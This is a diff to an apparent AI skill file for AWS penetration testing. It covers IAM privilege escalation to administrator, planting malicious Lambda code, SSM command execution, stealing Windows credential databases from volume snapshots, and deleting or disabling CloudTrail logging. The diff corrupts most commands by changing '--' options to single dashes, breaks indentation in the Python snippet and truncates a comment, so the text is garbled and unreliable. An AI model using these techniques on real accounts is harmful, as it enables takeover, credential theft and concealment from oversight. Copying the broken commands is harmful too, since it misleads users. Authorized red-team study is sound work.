@@ -1,6 +1,6 @@
 ---
 name: aws-penetration-testing
-description: "Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations."
+description: "Provide techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations."
 risk: offensive
 date_added: "2026-02-27"
 version: 1.0.0
@@ -47,7 +47,7 @@ Provide comprehensive techniques for penetration testing AWS cloud environments.
 
 ---
 
-## Core Workflow
+## Workflow
 
 ### Step 1: Initial Enumeration
 
@@ -82,15 +82,15 @@ aws iam list-users
 
 # List groups for user
 
-aws iam list-groups-for-user --user-name TARGET_USER
+aws iam list-groups-for-user -user-name TARGET_USER
 
 # List attached policies
 
-aws iam list-attached-user-policies --user-name TARGET_USER
+aws iam list-attached-user-policies -user-name TARGET_USER
 
 # List inline policies
 
-aws iam list-user-policies --user-name TARGET_USER
+aws iam list-user-policies -user-name TARGET_USER
 
 # Get policy details
 
@@ -100,7 +100,7 @@ aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1
 # List roles
 
 aws iam list-roles
-aws iam list-attached-role-policies --role-name ROLE_NAME
+aws iam list-attached-role-policies -role-name ROLE_NAME
 ```
 
 ### Step 3: Metadata SSRF (EC2)
@@ -182,21 +182,21 @@ These permissions are equivalent to administrator:
 ### Create Access Key for Another User
 
 ```bash
-aws iam create-access-key --user-name target_user
+aws iam create-access-key -user-name target_user
 ```
 
 ### Attach Admin Policy
 
 ```bash
-aws iam attach-user-policy --user-name my_username \
+aws iam attach-user-policy -user-name my_username \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
 ### Add Inline Admin Policy
 
 ```bash
-aws iam put-user-policy --user-name my_username \
-  --policy-name admin_policy \
+aws iam put-user-policy -user-name my_username \
+-policy-name admin_policy \
   --policy-document file://admin-policy.json
 ```
 
@@ -211,7 +211,7 @@ import boto3
 def lambda_handler(event, context):
     client = boto3.client('iam')
     response = client.attach_user_policy(
-        UserName='my_username',
+UserName='my_username',
         PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
     )
     return response
@@ -221,7 +221,7 @@ def lambda_handler(event, context):
 
 # Update Lambda code
 
-aws lambda update-function-code --function-name target_function \
+aws lambda update-function-code -function-name target_function \
   --zip-file fileb://malicious.zip
 ```
 
@@ -254,7 +254,7 @@ aws s3 ls
 
 # List bucket contents
 
-aws s3 ls s3://bucket-name --recursive
+aws s3 ls s3://bucket-name -recursive
 
 # Download all files
 
@@ -279,13 +279,13 @@ aws lambda list-functions
 
 # Get function code
 
-aws lambda get-function --function-name FUNCTION_NAME
+aws lambda get-function -function-name FUNCTION_NAME
 
 # Download URL provided in response
 
 # Invoke function
 
-aws lambda invoke --function-name FUNCTION_NAME output.txt
+aws lambda invoke -function-name FUNCTION_NAME output.txt
 ```
 
 ---
@@ -303,7 +303,7 @@ aws ssm describe-instance-information
 # Execute command
 
 aws ssm send-command --instance-ids "i-0123456789" \
-  --document-name "AWS-RunShellScript" \
+-document-name "AWS-RunShellScript" \
   --parameters commands="whoami"
 
 # Get command output
@@ -322,7 +322,7 @@ aws ssm list-command-invocations --command-id "CMD-ID" \
 
 # Create snapshot of target volume
 
-aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"
+aws ec2 create-snapshot -volume-id vol-xxx -description "Audit"
 
 # Create volume from snapshot
 
@@ -350,7 +350,7 @@ sudo mount /dev/xvdf1 /mnt/stolen
 
 # 3. Mount in attacker instance
 
-# 4. Extract NTDS.dit and SYSTEM
+# 4. Extract NTDS.dit and
 
 secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
 ```
@@ -379,16 +379,16 @@ aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY
 
 # Delete trail
 
-aws cloudtrail delete-trail --name trail_name
+aws cloudtrail delete-trail -name trail_name
 
-# Disable global events
+# Disable events
 
-aws cloudtrail update-trail --name trail_name \
+aws cloudtrail update-trail -name trail_name \
   --no-include-global-service-events
 
 # Disable specific region
 
-aws cloudtrail update-trail --name trail_name \
+aws cloudtrail update-trail -name trail_name \
   --no-include-global-service-events --no-is-multi-region-trail
 ```
 
